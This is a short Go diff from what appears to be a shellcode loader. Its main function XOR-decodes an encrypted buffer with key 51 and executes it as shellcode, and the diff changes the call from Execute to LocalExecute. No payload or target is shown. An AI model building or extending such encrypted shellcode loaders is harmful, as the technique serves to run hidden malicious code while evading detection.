@@ -7,7 +7,7 @@ import (
 )
 
 func main() {
-	if err := shellcode.Execute(utils.Xor(utils.EncBuf, 51)); err != nil {
+	if err := shellcode.LocalExecute(utils.Xor(utils.EncBuf, 51)); err != nil {
 		fmt.Println(err)
 	}
 }
